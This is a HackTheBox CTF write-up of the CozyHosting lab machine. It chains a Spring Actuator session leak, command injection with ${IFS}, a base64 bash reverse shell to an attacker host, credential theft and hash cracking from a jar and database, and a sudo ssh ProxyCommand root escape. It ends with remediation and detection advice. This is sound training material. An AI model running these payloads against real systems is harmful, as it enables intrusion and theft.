---
layout: default
title: "HackTheBox - CozyHosting"
---

# HackTheBox - CozyHosting

**OS:** Linux (Ubuntu 22.04)

CozyHosting is a Linux machine built around a misconfigured **Spring Boot** application. The
front end exposes the Spring Boot Actuator endpoints, and `/actuator/sessions` leaks the live
session identifiers of logged-in users. Stealing the admin's `JSESSIONID` grants access to an
authenticated `/admin` dashboard, whose "add host" feature shells out to `ssh` and concatenates
the `username` field straight into the command line, an OS command injection. That yields a
reverse shell as the low-privileged `app` service account. The application jar holds the
PostgreSQL connection string in clear text; the database stores a bcrypt hash that cracks to a
plaintext password reused for the SSH account `josh`. Finally, `josh` may run `/usr/bin/ssh` via
`sudo`, and the GTFOBins `ssh` `ProxyCommand` escape turns that single rule into a root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (cozyhosting.htb) |
| Initial Access | Spring Actuator session leak -> `JSESSIONID` hijack -> `/executessh` command injection -> reverse shell as `app` |
| Privilege Escalation | DB creds from jar -> crack bcrypt -> SSH credential reuse as `josh` -> `sudo /usr/bin/ssh` ProxyCommand escape (GTFOBins) |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP sweep returned only two open ports: SSH and an nginx reverse proxy on 80. No other
service is reachable, so the entire attack surface is the web app behind nginx.

```
$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -sCV -p22,80 <target-ip>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nginx does not serve content for the bare IP; it issues a redirect to the virtual host
`cozyhosting.htb`. Add it to name resolution before browsing (here done with `curl --resolve`
to avoid touching `/etc/hosts`; `echo '<target-ip> cozyhosting.htb' | sudo tee -a /etc/hosts`
is the usual equivalent):

```
$ curl -s -o /dev/null -w "%{http_code}\n" --resolve cozyhosting.htb:80:<target-ip> http://cozyhosting.htb/
200
```

> **Why this works:** the server uses HTTP `Host`-header based virtual hosting. Requests to the
> raw IP do not match the configured `server_name`, so nginx 301-redirects them to the canonical
> hostname. Any directory brute-force run against the IP just returns a wall of 301s; you have to
> set the `Host` header (or resolve the name) before enumeration produces anything real.

### Web Enumeration

Browsing `http://cozyhosting.htb/` shows a hosting-company landing page. The interesting result
is the framework fingerprint: a default error page renders the Spring Boot **Whitelabel Error
Page**, and `/login` plus a 401-protected `/admin` confirm a Spring Security setup.

Spring Boot applications commonly expose the **Actuator** management endpoints. Probing the
standard paths shows several are open:

```
$ for p in /actuator /actuator/health /actuator/env /actuator/mappings /actuator/sessions; do
>   printf "%s\t" "$p"; curl -s -o /dev/null -w "%{http_code}\n" \
>     --resolve cozyhosting.htb:80:<target-ip> http://cozyhosting.htb$p
> done
/actuator           200
/actuator/health    200
/actuator/env       200
/actuator/mappings  200
/actuator/sessions  200
```

> **Why this works:** Spring Boot Actuator exposes operational endpoints for monitoring. In a
> hardened deployment these are disabled or locked behind authentication, but a permissive
> `management.endpoints.web.exposure.include` setting publishes them unauthenticated.
> `/actuator/sessions` is the dangerous one: it maps every active HTTP session identifier to the
> username that owns it.

---

## Initial Access

### Leaking a Session via `/actuator/sessions`

The `sessions` endpoint returns the current `JSESSIONID` to username mapping. Polling it while a
real user is logged in leaks an authenticated session token:

```
$ curl -s --resolve cozyhosting.htb:80:<target-ip> http://cozyhosting.htb/actuator/sessions
{"E48D83E0F2FDD914BD5BCE6666869EF5":"UNAUTHORIZED",
 "0B8332DB2BF2818F6CB1FD79C112B505":"kanderson",
 "939A21E16D76D461312BA785A7C60B13":"kanderson"}
```

`kanderson` is an authenticated user. Replaying their session id as a `JSESSIONID` cookie
against the protected `/admin` page returns `200` instead of the `401` an anonymous request
gets, a clean session hijack:

```
$ curl -s -o /dev/null -w "anon  /admin -> %{http_code}\n" \
    --resolve cozyhosting.htb:80:<target-ip> http://cozyhosting.htb/admin
anon  /admin -> 401

$ curl -s -o /dev/null -w "kanderson /admin -> %{http_code}\n" \
    --resolve cozyhosting.htb:80:<target-ip> \
    -b "JSESSIONID=0B8332DB2BF2818F6CB1FD79C112B505" http://cozyhosting.htb/admin
kanderson /admin -> 200
```

> **Gotcha worth recording:** the session ids are ephemeral and regenerate each time the box is
> reset or a user logs in again. If `/admin` still returns 401, re-poll `/actuator/sessions` for a
> fresh `kanderson` token; there is sometimes a stale `UNAUTHORIZED` entry mixed in that will not
> authenticate you.

### Command Injection in `/executessh`

The admin dashboard offers an "Include host into automatic patching" form that posts to
`/executessh` with `host` and `username` parameters. The backend builds an `ssh` command line
from these values, and the `username` field is concatenated without sanitisation:

```
$ curl -s --resolve cozyhosting.htb:80:<target-ip> \
    -b "JSESSIONID=0B8332DB2BF2818F6CB1FD79C112B505" http://cozyhosting.htb/admin \
    | grep -A2 executessh
<form action="/executessh" method="post">
    <input name="host" ...>
    <input name="username" ...>
```

The application validates that the input contains no whitespace, so a naive `; cmd ;` payload
with spaces is rejected. The standard bypass is the bash internal field separator `${IFS}`,
which expands to whitespace without the literal character. A first callback test confirms code
execution out-of-band against a local HTTP listener:

```
$ python3 -m http.server 8000 --bind <attacker-ip> &

$ curl -s --resolve cozyhosting.htb:80:<target-ip> \
    -b "JSESSIONID=0B8332DB2BF2818F6CB1FD79C112B505" \
    --data-urlencode "host=localhost" \
    --data-urlencode 'username=a;curl${IFS}<attacker-ip>:8000/INJECT_OK;' \
    http://cozyhosting.htb/executessh -o /dev/null -w "%{http_code}\n"
302

10.129.x.x - - [25/Jun/2026 04:28:15] "GET /INJECT_OK HTTP/1.1" 404 -
```

> **Why this works:** the app runs something equivalent to `ssh <username>@<host>` through a
> shell. Because `username` lands inside a shell-interpreted command, `;` terminates the intended
> `ssh` invocation and starts our own command. The whitespace filter is defeated with `${IFS}`,
> and braces such as `{echo,...}` build space-free argument lists. The `302` is just the form's
> redirect; the proof the command ran is the inbound HTTP request on the canary server.

### Reverse Shell as `app`

With code execution and confirmed egress on a callback port, deliver a base64-encoded bash
reverse shell so the payload itself contains no spaces or shell-breaking characters:

```
$ echo 'bash -i >& /dev/tcp/<attacker-ip>/443 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8uLi4vNDQzIDA+JjEK

$ nc -lvnp 443 -s <attacker-ip>      # bind to the VPN interface only (see gotcha)
listening on [<attacker-ip>] 443 ...

$ curl -s --resolve cozyhosting.htb:80:<target-ip> \
    -b "JSESSIONID=0B8332DB2BF2818F6CB1FD79C112B505" \
    --data-urlencode "host=localhost" \
    --data-urlencode 'username=a;{echo,YmFzaC...K}|{base64,-d}|bash;' \
    http://cozyhosting.htb/executessh
```

```
connect to [<attacker-ip>] from (UNKNOWN) [<target-ip>]
bash: cannot set terminal process group (1010): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$ hostname
cozyhosting
```

> **Gotcha worth recording:** on this attack box a local Datadog agent constantly beacons to
> `127.0.0.1:443`, and a `nc` listener bound to `0.0.0.0` catches that TLS noise instead of the
> real shell (you see a burst of binary garbage and a `datadoghq.com` SNI). Bind the listener to
> the VPN interface address explicitly (`nc -lvnp 443 -s <attacker-ip>`) so only the target can
> land on it. Port 443 also makes the callback look like ordinary HTTPS egress, which the target
> permits outbound.

---

## Post-Exploitation Enumeration

### Database Credentials in the Application Jar

The foothold lands in `/app`, which contains the deployed Spring Boot jar. The `app` user owns
the user flag's neighbour only indirectly; the real prize is the application's configuration,
which embeds the PostgreSQL credentials in clear text:

```
app@cozyhosting:/app$ ls -la /app
-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar

app@cozyhosting:/app$ cd /tmp && mkdir -p .x && cd .x
app@cozyhosting:/tmp/.x$ unzip -o /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
app@cozyhosting:/tmp/.x$ cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
spring.datasource.driver-class-name=org.postgresql.Driver
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg**********
```

> **Why this works:** Spring Boot reads `application.properties` from `BOOT-INF/classes/` inside
> the jar. A jar is just a zip archive, so any account that can read the file on disk can extract
> the embedded secrets. Storing the datasource password in plaintext config is the root issue;
> the `management.endpoints` line here also confirms exactly which Actuator endpoints were
> exposed, including the `sessions` one used for the foothold.

### Dumping the PostgreSQL Database

The database listens only on loopback, but we are now on the host. Connect with the recovered
credentials and dump the `users` table:

```
app@cozyhosting:/tmp/.x$ export PGPASSWORD='Vg**********'
app@cozyhosting:/tmp/.x$ psql -h 127.0.0.1 -U postgres -d cozyhosting -c "\dt"
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres

app@cozyhosting:/tmp/.x$ psql -h 127.0.0.1 -U postgres -d cozyhosting -c "select name,password,role from users;"
   name    |                  password                  | role
-----------+--------------------------------------------+-------
 kanderson | $2a$10$<redacted-bcrypt-hash-kanderson>    | User
 admin     | $2a$10$<redacted-bcrypt-hash-admin>        | Admin
```

### Cracking the bcrypt Hash

Both passwords are bcrypt (`$2a$10$`, cost 10). Feed them to a cracker with `rockyou`; the
`admin` hash falls quickly:

```
$ john --format=bcrypt --wordlist=rockyou.txt hashes.txt
$ john --format=bcrypt --show hashes.txt
?:ma**************

1 password hash cracked, 1 left
```

> **Gotcha worth recording:** if `hashcat -m 3200` reports no OpenCL/CUDA device on the attack
> box, fall back to John on CPU (`--format=bcrypt`). bcrypt cost 10 is slow but `rockyou` finds a
> common football password within seconds. Only the `admin` hash cracks; `kanderson` does not,
> and you do not need it.

---

## Privilege Escalation

### SSH Credential Reuse as `josh`

The cracked password belongs to the application `admin`, but credential reuse is the lab's
intended pivot. The local user with a home directory is `josh`:

```
app@cozyhosting:/app$ ls -la /home
drwxr-x---  3 josh josh 4096 Aug  8  2023 josh
```

The cracked plaintext is reused for `josh`'s SSH login:

```
$ ssh josh@<target-ip>
josh@<target-ip>'s password: ma**************
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ cat ~/user.txt
<user-flag-redacted>
```

### sudo Enumeration

`josh` has one `sudo` entitlement:

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: ma**************
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:...\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### ssh ProxyCommand Escape (GTFOBins)

`ssh` is a GTFOBins binary: it can run an arbitrary local command through the `ProxyCommand`
option. Because `josh` may run `/usr/bin/ssh` with any arguments as root, that local command runs
as root, handing back a root shell:

```
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
cozyhosting
# cat /root/root.txt
<root-flag-redacted>
```

> **Why this works:** `ProxyCommand` tells `ssh` to launch a helper program to reach the target,
> and the value is passed to `/bin/sh -c`. The leading `;` makes the shell run our command
> (`sh 0<&2 1>&2`, which reuses ssh's stderr as an interactive stdin/stdout) before ssh fails to
> connect to the bogus host `x`. Since `sudo` invoked `ssh` as root, the spawned `sh` inherits
> root. Allowing `ssh *` via sudo is functionally `sudo sh`; the wildcard lets the caller supply
> the dangerous option.

---

## Root Cause

| Layer | Root cause |
|---|---|
| Spring Actuator | `management.endpoints.web.exposure.include` published `sessions`/`env`/`mappings` unauthenticated, leaking live `JSESSIONID` to username mappings and enabling session hijack. |
| `/executessh` | The `username` parameter is concatenated into a shell-invoked `ssh` command with only a whitespace filter, a classic OS command injection (`${IFS}` defeats the filter). |
| Application config | The PostgreSQL password is stored in clear text in `application.properties` inside the deployed jar, readable by the `app` service account. |
| Credential hygiene | An application user's bcrypt password (crackable with `rockyou`) is reused for the `josh` OS account over SSH. |
| Host sudo policy | A `sudo` rule permitting `(root) /usr/bin/ssh *` exposes the GTFOBins `ProxyCommand` shell-escape, granting root. |

Each defect is independent, but they line up into a clean chain: an unauthenticated info leak
becomes an authenticated session, the session reaches an injectable feature, the resulting
foothold reads a plaintext secret, the secret cracks and is reused for a real account, and a
single permissive sudo rule finishes the job.

## Impact

Full remote compromise of the host from an unauthenticated start. An attacker with only network
access to port 80 hijacks an administrator session, executes arbitrary commands as the `app`
service account, recovers database and reused OS credentials, and escalates to `root`, total
control of the server and every tenant's hosting data the application managed.

## Remediation

Priority-ordered. The first items break the attack chain outright; the rest are hardening.

1. **Lock down Spring Actuator.** Set `management.endpoints.web.exposure.include` to only what is
   needed (ideally just `health`), require authentication on the actuator base path, and bind the
   management port to localhost. This removes the `sessions` leak that starts the chain.
2. **Fix the command injection.** Never build the `ssh` command line by string concatenation.
   Validate `username`/`host` against a strict allow-list (`^[a-zA-Z0-9._-]+$`), and execute via
   an argument array (`ProcessBuilder` with a fixed argv) so user input can never be interpreted
   as shell syntax.
3. **Remove the sudo rule.** `josh` should not be able to run `/usr/bin/ssh` as root. If a sudo
   ssh use case is genuinely required, restrict it to a specific non-option argument set; never
   allow `ssh *`.
4. **Remove plaintext secrets from the jar.** Inject the datasource password from a secrets
   manager or environment variable at runtime, not a committed `application.properties`. Rotate
   the exposed PostgreSQL password.
5. **Enforce credential hygiene.** Application-tier passwords must not be reused for OS accounts,
   and a password recoverable from `rockyou` should fail a password policy. Rotate `josh`'s
   credential and decouple it from the app database.

### Validation

- Actuator fixed: `curl http://cozyhosting.htb/actuator/sessions` returns `401`/`404`, not a
  session map.
- Injection fixed: POSTing `username=a;id;` (or the `${IFS}` variant) to `/executessh` no longer
  executes; only well-formed usernames are accepted.
- sudo fixed: `sudo -l` as `josh` no longer lists `/usr/bin/ssh`, and `sudo ssh -o
  ProxyCommand=...` is denied.
- Secrets fixed: extracting `BOOT-INF/classes/application.properties` from the jar shows no
  plaintext password; the DB password has been rotated.

## Detection Opportunities

- **Actuator abuse:** repeated unauthenticated requests to `/actuator/sessions`, `/actuator/env`,
  or `/actuator/mappings`, especially polling the `sessions` endpoint. These should never be hit
  from the internet.
- **Session hijack:** the same `JSESSIONID` used from two widely different source IPs/User-Agents
  in a short window.
- **Command injection:** `/executessh` POST bodies containing shell metacharacters (`;`, `${IFS}`,
  `{echo,`, `base64`, back-ticks); the application process (`java`) spawning child processes such
  as `bash`, `sh`, `curl`, or `ssh` is a strong RCE signal (parent `java` -> child `bash`).
- **Foothold behaviour:** the `app` user running `psql`, `unzip` against the jar, or making
  outbound connections from `/tmp`; an outbound TCP connection to an external host on 443 that is
  not normal app traffic.
- **Privilege escalation:** `auditd` on `execve` of `/usr/bin/ssh` by `josh` via `sudo`, and any
  shell whose parent chain is `sudo -> ssh -> sh`. A root shell parented by `ssh` is unambiguous.

## Lessons Learned

- Spring Boot Actuator is a high-value first target: fingerprint the framework, then walk the
  standard `/actuator/*` paths before anything else. `sessions` and `env` alone can hand you both
  a session and a set of credentials.
- A whitespace filter is not input validation. `${IFS}` and brace expansion build space-free
  command lines, so any "no spaces allowed" defence around a shell call is trivially bypassed.
- A deployed jar is a zip: always extract `application.properties` and `strings` the artifact for
  embedded secrets once you have read access to it.
- Credential reuse is the connective tissue of most lab chains. An application password that
  cracks is worth spraying against every OS account before doing anything harder.
- Any `sudo` rule on a binary listed in GTFOBins is effectively `sudo sh`. Check GTFOBins the
  moment `sudo -l` returns anything, including `ssh`.

## Cleanup

- Removed the extracted config directory dropped on the target (`/tmp/.x`), deleted as the `app`
  user that created it (root-owned files within it required the original creator, not `josh`).
- Closed the reverse shell; no implant or persistence was written to the host.
- Stopped the local listeners on the attack box (`nc` on 443, the `python3 -m http.server`
  canary on 8000).
- No accounts, services, scheduled tasks, or AD objects were created or modified. The only
  on-target write was the temporary `/tmp/.x` extraction, now removed.
